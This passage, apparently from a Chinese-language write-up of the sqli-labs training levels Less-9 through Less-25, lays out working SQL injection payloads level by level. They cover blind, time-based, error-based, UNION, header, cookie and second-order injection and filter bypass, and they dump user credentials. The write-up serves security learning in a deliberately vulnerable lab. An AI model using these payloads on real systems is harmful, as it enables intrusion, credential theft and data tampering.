class="line"># ascii:0x69、105、i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1&#x27;)) and ascii(substr((select group_concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users),1,1))=49 -- -</span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line"># ascii:0x31、49、1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>通过手注的方式效率过低，所以使用python写脚本进行布尔盲注</p>
+</blockquote>
+<h4 id="Less-9、Less-10（时间盲注）"><a href="#Less-9、Less-10（时间盲注）" class="headerlink" title="Less-9、Less-10（时间盲注）"></a>Less-9、Less-10（时间盲注）</h4><p>使用的是 <strong>GET</strong> 请求，格式如下：<code>?id=1</code></p>
+<p>存在id为1的记录，会显示<code>You are in...........</code></p>
+<p>不存在id为0的记录，但是也显示<code>You are in...........</code></p>
+<p>后台对数据库的报错进行了处理，不能进行 <strong>报错注入</strong>。 </p>
+<p>因为但是不管对错，只显示一种结果。所以也无法使用 <strong>布尔盲注</strong>。</p>
+<p>最后来使用<strong>时间盲注</strong>，判断闭合方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(1=2, 1, sleep(4))--+</span><br><span class="line"></span><br><span class="line">Less-9 延迟了几秒钟。证明可以时间盲注，闭合方式为 单引号</span><br><span class="line"></span><br><span class="line">?id=1&quot; and if(1=2, 1, sleep(4))--+</span><br><span class="line"></span><br><span class="line">Less-10 延迟了几秒钟，证明可以时间盲注，闭合方式为 双引号</span><br></pre></td></tr></table></figure>
+
+<p>通过<strong>时间盲注</strong>来获取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length(database())=8 and sleep(3) -- -</span><br><span class="line"># 通过布尔盲注，得出当前使用的数据库的长度为8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1&#x27; and if((ascii(substr(database(),1,1))=115),sleep(3),1) -- -</span><br><span class="line"># 通过布尔盲注，得出当前使用的数据库的名字的第一个字符是s，&#x27;s&#x27;的ascii码是0x73、115</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1&#x27; and if((ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=105,sleep(3),1) -- -</span><br><span class="line"># 通过布尔盲注，得出所有数据库名称拼接成的字符串的第一个字符是i，&#x27;i&#x27;的ascii码是0x69、105</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1&#x27; and if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),1,1))=101,sleep(3),1) -- -</span><br><span class="line"># 查询security数据库中的所有表名</span><br><span class="line"># ascii:0x65、101、e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1&#x27; and if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),1,1))=105,sleep(3),1) -- -</span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line"># ascii:0x69、105、i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?id=1&#x27; and if((ascii(substr((select group_concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users),1,1))=1,sleep(3),1) -- -</span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line"># ascii:0x31、49、1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>通过手注的方式效率过低，所以使用python写脚本进行时间盲注</p>
+</blockquote>
+<blockquote>
+<p>但是时间盲注所需的时间太长，效率也底下</p>
+</blockquote>
+<h4 id="Less-11、Less-12"><a href="#Less-11、Less-12" class="headerlink" title="Less-11、Less-12"></a>Less-11、Less-12</h4><p>使用的是 <strong>POST</strong> 请求</p>
+<p>输入正确的 <code>Username</code> 和 <code>Password</code> 会显示用户数据</p>
+<p>寻找注入点，判断闭合方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Username:0&#x27; or 1=1 -- -</span><br><span class="line">Password:0</span><br><span class="line">Less-11显示用户数据，存在注入点，闭合方式为 单引号</span><br><span class="line"></span><br><span class="line">Username:0&quot;) or 1=1 -- -</span><br><span class="line">Password:0</span><br><span class="line">Less-12显示用户数据，存在注入点，闭合方式为 双引号+括号+括号</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>判断列数及回显位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Username:0&#x27; union select 9,8 -- -</span><br><span class="line">Password:0</span><br><span class="line">Less-11显示用户数据，显示9和8，列数是2位，回显也是2位</span><br><span class="line"></span><br><span class="line">Username:0&quot;) union select 9,8 -- -</span><br><span class="line">Password:0</span><br><span class="line">Less-12显示用户数据，显示9和8，列数是2位，回显也是2位</span><br></pre></td></tr></table></figure>
+
+<p>取数据</p>
+<blockquote>
+<p>Less-11 和 Less-12 的过程差不多，这里就以 Less-11 为例</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名和用户名</span><br><span class="line">Username:0&#x27; union select 1,database(),user()-- -</span><br><span class="line">Password:</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">Username:</span><br><span class="line">Password:0&#x27; union select 3,group_concat(schema_name) from information_schema.schemata -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">Username:0&#x27; union select 3,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class="line">Password:</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">Username:</span><br><span class="line">Password:0&#x27; union select 3,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- -</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">Username:0&#x27; union select 3,group_concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users -- -</span><br><span class="line">Password:</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-13、Less-14、Less-15、Less-16（布尔注入）"><a href="#Less-13、Less-14、Less-15、Less-16（布尔注入）" class="headerlink" title="Less-13、Less-14、Less-15、Less-16（布尔注入）"></a>Less-13、Less-14、Less-15、Less-16（布尔注入）</h4><p>使用的是 <strong>POST</strong> 请求</p>
+<p>输入正确的 <code>Username</code> 和 <code>Password</code> 会显示一个 <code>flag.jpg</code> 的图片，输入错误的 <code>Username</code> 和 <code>Password</code> 会显示另一张图片</p>
+<p>后台对数据库的报错进行了处理，不能进行 <strong>报错注入</strong>。 </p>
+<p>寻找注入点，判断闭合方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Username:0&#x27;) or 1=1 -- -</span><br><span class="line">Password:0</span><br><span class="line">Less-13显示正常，存在注入点，闭合方式为 单引号+括号</span><br><span class="line"></span><br><span class="line">Username:0&quot; or 1=1 -- -</span><br><span class="line">Password:0</span><br><span class="line">Less-14显示正常，存在注入点，闭合方式为 单引号+括号</span><br><span class="line"></span><br><span class="line">Username:0&#x27; or 1=1 -- -</span><br><span class="line">Password:0</span><br><span class="line">Less-15显示正常，存在注入点，闭合方式为 单引号</span><br><span class="line"></span><br><span class="line">Username:0&quot;) or 1=1 -- -</span><br><span class="line">Password:0</span><br><span class="line">Less-16显示正常，存在注入点，闭合方式为 单引号</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>因为 Less-13、Less-14、Less-15、Less-16只是闭合方式不同，其它的差不多，所以只用Less-13进行举例</p>
+</blockquote>
+<p>尝试使用<strong>布尔盲注</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Username:0&#x27;) or length(database())=8 -- -</span><br><span class="line">Password:</span><br><span class="line"># 通过布尔盲注，得出当前使用的数据库的长度为8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Username:0&#x27;) or ascii(substr(database(),1,1))=115 -- -</span><br><span class="line">Password:</span><br><span class="line"># 通过布尔盲注，得出当前使用的数据库的名字的第一个字符是s，&#x27;s&#x27;的ascii码是0x73、115</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Username:0&#x27;) or ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=105 -- -</span><br><span class="line">Password:</span><br><span class="line"># 通过布尔盲注，得出所有数据库名称拼接成的字符串的第一个字符是i，&#x27;i&#x27;的ascii码是0x69、105</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Username:0&#x27;) or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),1,1))=101 -- -</span><br><span class="line">Password:</span><br><span class="line"># 查询security数据库中的所有表名</span><br><span class="line"># ascii:0x65、101、e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Username:0&#x27;) or ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),1,1))=105 -- -</span><br><span class="line">Password:</span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line"># ascii:0x69、105、i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Username:0&#x27;) or ascii(substr((select group_concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users),1,1))=49 -- -</span><br><span class="line">Password:</span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line"># ascii:0x31、49、1</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-17（报错注入）"><a href="#Less-17（报错注入）" class="headerlink" title="Less-17（报错注入）"></a>Less-17（报错注入）</h4><p>使用的是 <strong>POST</strong> 请求。。</p>
+<p>输入正确的 <code>User Name</code> 会显示一个 <code>flag.jpg</code> 的图片，输入错误的 <code>User Name</code>会显示另一张图片。</p>
+<p>后台对传输过去的 <code>User Name</code> 进行了转义处理，且用的是 <strong>utf-8</strong> 编码。</p>
+<p>所以它是通过用户名来改密码，知道用户名是这个关卡的前提条件。 </p>
+<p>寻找注入点，判断闭合方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User Name   :admin1</span><br><span class="line">New Password:1&#x27; where 2=1 -- -</span><br><span class="line"></span><br><span class="line">正常，并且显示成功，说明后端没有对Username进行转义了，注入的功能是把当前使用的表的密码全部改成了1，闭合方式是 单引号</span><br></pre></td></tr></table></figure>
+
+<p>使用<strong>报错注入</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">User Name   :admin1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">New Password:1&#x27; and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) -- -</span><br><span class="line"># 查询当前的数据库名（有长度限制，最多64位）</span><br><span class="line"></span><br><span class="line">New Password:1&#x27; and (extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e))) -- -</span><br><span class="line"># 查询所有的数据库名（extractvalue()有长度限制，最多32位）</span><br><span class="line"></span><br><span class="line">New Password:1&#x27; and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)) -- -</span><br><span class="line"># 查询当前数据库中的所有表名（updatexml()有长度限制，最多32位）</span><br><span class="line"></span><br><span class="line">New Password:1&#x27; and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),floor(rand(0)*2))x from information_schema.tables group by x)a) -- -</span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名（有长度限制，最多64位）</span><br><span class="line"></span><br><span class="line">New Password:1&#x27; and (extractvalue(1,concat(0x7e,(select group_concat(id) from security.users),0x7e))) -- -</span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据（extractvalue()和updatexml()都有长度限制，最多32位）</span><br><span class="line"></span><br><span class="line">New Password:1&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users where id=&#x27;1&#x27;),0x7e),1) -- -</span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据（extractvalue()和updatexml()都有长度限制，最多32位）</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>报错注入行得通，直接使用报错注入，不用使用布尔盲注</p>
+</blockquote>
+<h4 id="Less-18、Less-19（请求头）"><a href="#Less-18、Less-19（请求头）" class="headerlink" title="Less-18、Less-19（请求头）"></a>Less-18、Less-19（请求头）</h4><p>使用的是 <strong>POST</strong> 请求。。</p>
+<p>输入正确的 <code>Username</code> 和 <code>Password</code> 会显示一个 <code>flag.jpg</code> 的图片，输入错误的 <code>Username</code> 和 <code>Password</code> 会显示另一张图片。</p>
+<p>后台对传输过去的 <code>Username</code> 和 <code>Password</code> 进行了转义处理，且用的是 <strong>utf-8</strong> 编码，所以不能通过 <code>Username</code> 和 <code>Password</code> 来进行注入。 </p>
+<p>后台会将请求头或进行拼接插入表中，所以前提条件是已知登录成功的 <code>Username</code> 和 <code>Password</code> 和 请求头。</p>
+<blockquote>
+<p>看了一下源码， <code>Username</code> 和 <code>Password</code> 都输入0，也可以成功，感觉有问题</p>
+</blockquote>
+<p>要输入正确的  <code>Username</code> 和 <code>Password</code> ，然后在请求头用 <strong>报错注入</strong> 。因为后台会把数据库报错显示给前端。</p>
+<p>Less-18 的 <strong>User-Agent</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;&quot;User-Agent&quot;: &quot;123&#x27;,(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a),321) -- -&quot;&#125;</span><br><span class="line"># 报错注入</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>Less-19 的 <strong>Referer</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;&quot;Referer&quot;:&quot;1&#x27;,(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) ) -- -&quot;&#125;</span><br><span class="line"># 报错注入</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-20（Cookie）"><a href="#Less-20（Cookie）" class="headerlink" title="Less-20（Cookie）"></a>Less-20（Cookie）</h4><p>使用的是 <strong>POST</strong> 请求。。</p>
+<p>输入正确的 <code>Username</code> 和 <code>Password</code> 会显示一个 <code>flag.jpg</code> 的图片，输入错误的 <code>Username</code> 和 <code>Password</code> 会显示另一张图片。</p>
+<p>后台对传输过去的 <code>Username</code> 和 <code>Password</code> 进行了转义处理，且用的是 <strong>utf-8</strong> 编码，所以不能通过 <code>Username</code> 和 <code>Password</code> 来进行注入。 </p>
+<p>后台会将<strong>cookies</strong>进行拼接插入表中，所以前提条件是已知登录成功的 <code>Username</code> 和 <code>Password</code> 和 <strong>cookies</strong>。</p>
+<p>Less-20 的 <strong>cookies</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cookies=&#123;&quot;uname&quot;:&quot;0&#x27; union select 9,database(),user() -- -&quot;&#125;</span><br><span class="line"># 直接获取数据</span><br><span class="line"></span><br><span class="line">cookies=&#123;&quot;uname&quot;:&quot;0&#x27; or  (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) -- -&quot;&#125;</span><br><span class="line"># 报错注入</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-21、Less-22（编码、Cookie）"><a href="#Less-21、Less-22（编码、Cookie）" class="headerlink" title="Less-21、Less-22（编码、Cookie）"></a>Less-21、Less-22（编码、Cookie）</h4><p>使用的是 <strong>POST</strong> 请求。。</p>
+<p>输入正确的 <code>Username</code> 和 <code>Password</code> 会显示一个 <code>flag.jpg</code> 的图片，输入错误的 <code>Username</code> 和 <code>Password</code> 会显示另一张图片。</p>
+<p>后台对传输过去的 <code>Username</code> 和 <code>Password</code> 进行了转义处理，且用的是 <strong>utf-8</strong> 编码，所以不能通过 <code>Username</code> 和 <code>Password</code> 来进行注入。 </p>
+<p>后台会将<strong>cookies</strong>进行<strong>Base64</strong>编码然后回显，传参给后台时会解码，然后插入表中，所以前提条件是已知登录成功的 <code>Username</code> 和 <code>Password</code> 和 <strong>cookies</strong>。</p>
+<blockquote>
+<p>已知<strong>cookies</strong>的名字是<strong>uname</strong></p>
+</blockquote>
+<p>Less-21</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cookies=&#123;&quot;uname&quot;:&quot;123&quot;&#125;</span><br><span class="line"></span><br><span class="line">cookies[&quot;uname&quot;]=str(base64.b64encode(&quot;0&#x27;) union select 9,database(),user() -- -&quot;.encode())).strip(&quot;b&#x27;&quot;)</span><br><span class="line"># 直接获取数据</span><br><span class="line"></span><br><span class="line">cookies[&quot;uname&quot;]=str(base64.b64encode(&quot;0&#x27;) or  (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) -- -&quot;.encode())).strip(&quot;b&#x27;&quot;)</span><br><span class="line"># 报错注入</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=(&#x27;$cookee&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>Less-22</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cookies=&#123;&quot;uname&quot;:&quot;123&quot;&#125;</span><br><span class="line"></span><br><span class="line">cookies[&quot;uname&quot;]=str(base64.b64encode(&#x27;0&quot; union select 9,database(),user() -- -&#x27;.encode())).strip(&quot;b&#x27;&quot;)</span><br><span class="line"># 直接获取数据</span><br><span class="line"></span><br><span class="line">cookies[&quot;uname&quot;]=str(base64.b64encode(&#x27;0&quot; or  (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) -- -&#x27;.encode())).strip(&quot;b&#x27;&quot;)</span><br><span class="line"># 报错注入</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line">$cookee1 = &#x27;&quot;&#x27;. $cookee. &#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h4><p>使用的是 <strong>GET</strong> 请求，格式如下：<code>?id=1</code></p>
+<p>后台对传输过去的<strong>id值</strong>进行处理，包含 <code>&#39;#&#39;</code> 、 <code>&#39;--&#39;</code> 的会被替换掉。 </p>
+<p>存在id为1的记录，会显示用户名和密码，否则无显示</p>
+<p>寻找注入点，判断闭合方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">闭合方式为单引号</span><br></pre></td></tr></table></figure>
+
+<p>判断列数及回显位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 9,8,&#x27;7</span><br><span class="line"></span><br><span class="line">回显为8、7</span><br></pre></td></tr></table></figure>
+
+<p>取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名</span><br><span class="line">?id=0&#x27; union select 1,database(),&#x27;7</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?id=0&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),&#x27;7</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">?id=0&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#x27;7</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">?id=0&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),&#x27;7</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有数据</span><br><span class="line">?id=0&#x27; union select 1,(select group_concat(id,&#x27;~&#x27;,username,0x7e,password) from security.users),&#x27;7</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-24（二次注入）"><a href="#Less-24（二次注入）" class="headerlink" title="Less-24（二次注入）"></a>Less-24（二次注入）</h4><p>使用的是 <strong>POST</strong> 请求。</p>
+<p>输入正确的 <code>Username</code> 和 <code>Password</code> 会显示一个 <code>flag.jpg</code> 的图片，输入错误的 <code>Username</code> 和 <code>Password</code> 会显示另一张图片。</p>
+<p>后台对传输过去的 <code>Username</code> 和 <code>Password</code> 都会进行转义处理。 但是转义处理不会转义掉 <code>#</code>。</p>
+<p>这一关是进行二次注入。前提是已知管理员的账户名称。比如：<strong>admin1</strong>。</p>
+<p>后台是把我们的用户名 <code>admin1&#39;#</code> 保存到session里面，并且在更新数据时，是使用的session里的用户名，并且是直接拼接。</p>
+<p>于是改数据也就是改密码的时候，就会变成是更改<code>admin1</code>的数据密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$username= $_SESSION[&quot;username&quot;];</span><br><span class="line">$curr_pass= mysql_real_escape_string($_POST[&#x27;current_password&#x27;]);</span><br><span class="line">$pass= mysql_real_escape_string($_POST[&#x27;password&#x27;]);</span><br><span class="line">$re_pass= mysql_real_escape_string($_POST[&#x27;re_password&#x27;]);</span><br><span class="line"></span><br><span class="line">if($pass==$re_pass)</span><br><span class="line">&#123;	</span><br><span class="line">    $sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Less-25、Less-25a"><a href="#Less-25、Less-25a" class="headerlink" title="Less-25、Less-25a"></a>Less-25、Less-25a</h4><p>使用的是 <strong>GET</strong> 请求，格式如下：<code>?id=1</code></p>
+<p>后台对传输过去的<strong>id值</strong>进行处理，包含 <code>&#39;or&#39;</code> 、 <code>&#39;OR&#39;</code> 、 <code>&#39;and&#39;</code> 、 <code>&#39;AND&#39;</code> 的会被替换掉。 </p>
+<p>存在id为1的记录，会显示用户名和密码，否则无显示</p>
+<p>寻找注入点，判断闭合方式，判断回显位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 9,8,7 -- - </span><br><span class="line"></span><br><span class="line">Less-25 正常显示，存在闭合点，闭合方式为 单引号。回显位是8、7</span><br><span class="line"></span><br><span class="line">?id=0 union select 9,8,7 -- - </span><br><span class="line"></span><br><span class="line">Less-25a 正常显示，存在闭合点，闭合方式为 直接拼接。回显位是8、7</span><br></pre></td></tr></table></figure>
+
+<p>取数据</p>
+<blockquote>
+<p>注意：<code>information_schema</code> 、 <code>password</code> 里的 <code>or</code> 也会被替换掉，所以要把 <code>or</code> 变成 <code>oorr</code></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 当前数据库名和用户名</span><br><span class="line">?id=0&#x27; union select 1,database(),user()-- -</span><br><span class="line">?id=0 union select 1,database(),user()-- -</span><br><span class="line"></span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">?id=0&#x27; union 